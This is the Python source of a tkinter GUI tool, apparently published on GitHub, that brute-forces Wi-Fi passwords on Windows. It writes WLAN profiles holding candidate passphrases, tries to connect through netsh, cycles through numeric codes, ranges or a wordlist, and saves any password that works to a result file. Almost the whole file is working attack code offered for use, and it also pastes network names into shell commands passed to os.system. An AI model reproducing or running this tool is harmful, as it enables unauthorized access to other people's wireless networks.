import tkinter as tk
from tkinter import *
import subprocess
import time
import os
import re

def createNewConnection(name, SSID, password):
    config = """<?xml version=\"1.0\"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>"""+name+"""</name>
    <SSIDConfig>
        <SSID>
            <name>"""+SSID+"""</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>"""+password+"""</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""
    command = "netsh wlan add profile filename=\""+name+".xml\""+" interface=Wi-Fi"
    with open(name+".xml", 'w') as file:
        file.write(config)
    os.system(command)
    # time.sleep(0.1)
    # os.remove('name.xml')

def connect(name, SSID):
    command = "netsh wlan connect name=\""+name+"\" ssid=\""+SSID+"\" interface=Wi-Fi"
    os.system(command)

def displayAvailableNetworks():
    results = subprocess.check_output(['netsh','wlan','show','network'])
    results = results.decode("ascii")
    results = results.replace("\r","")
    ls = results.split("\n")
    ls = ls[4:]
    ssids = []
    x = 0
    while x < len(ls):
        if x % 5 == 0:
            if len(ls[x]) >= 1 and not re.search(r'[/\\*?\"<>|]',ls[x]):
                ssids.append(re.search(r':\s+(.+)',ls[x])[1])
        x += 1
    return ssids

def getWiFi():
    wifi = subprocess.check_output(['netsh', 'WLAN', 'show', 'interfaces'])
    data = wifi.decode('utf-8')
    return re.search(r'State\s+: connected',data),(re.search(r'State\s+: connected',data) and re.search(r'SSID\s+: (.+)\r',data)[1] or '')

def parse_codes(C):
  for i in range((C*10000000)):
    code = str(i).zfill(C)
    print(code)

def bruteforce(name):

    find = False
    for w in displayAvailableNetworks():
        if w == name:
            find = True
    if find == False:
        print('ERROR NAME WI-FI')
        SSID_label['text'] = 'SSID(error name SSID)'
        return False

    def try_connect(password):
        with open(name+'.txt','a') as f:
            f.write('\n'+password)
        createNewConnection(name, name, password)
        connect(name, name)
        print(password)
        # time.sleep(0.2)`
        wifi,wifi_name = getWiFi()
        if wifi != None and wifi_name == name:
            with open('RESULT_'+name+'.txt','w') as f:
                f.write('password:\n'+password)
            return True
        return False

    if len(password_list.get()) == 0:
        for RANGE in range(8,13):
            for i in range((RANGE*10000000)):
                code = str(i).zfill(RANGE)
                try_connect(code)
        return False
    else:
        if re.search(r'^\d+\-\d+$',password_list.get()):
            m = re.search(r'^(\d+)\-(\d+)$',password_list.get())
            for code in range(int(m[1]),int(m[2])):
                try_connect(str(code).zfill(8))

        elif not os.path.exists(password_list.get()):
            return False
        else:
            with open(password_list.get(),'r') as f:
                for l in f.read().split('\n'):
                    try_connect(l)
            return False

def ATTACK():
    if len(SSID.get()) == 0 or re.search(r'^\s+$',SSID.get()):
        print('1')
    else:
        bruteforce(SSID.get())
def faq():
    os.system('explorer "https://github.com/v3sp4n/wifi-bruteforce/blob/main/python/readme.md"')


# bruteforce()


window = tk.Tk()
window.title('bruteforce WI-FI / by vespan')
window.minsize(350,0)


SSID_label = tk.Label(text="SSID")
SSID_label.pack()
SSID = tk.Entry()
SSID.pack()

password_list_label = tk.Label(text="password list/range \"min-max\"")
password_list_label.pack()
password_list = tk.Entry()
password_list.pack()


button = tk.Button(text="ATTACK", command=ATTACK)
button.pack()
button = tk.Button(text="(faq&github)", command=faq, bg = 'gray')
button.pack()
window.mainloop()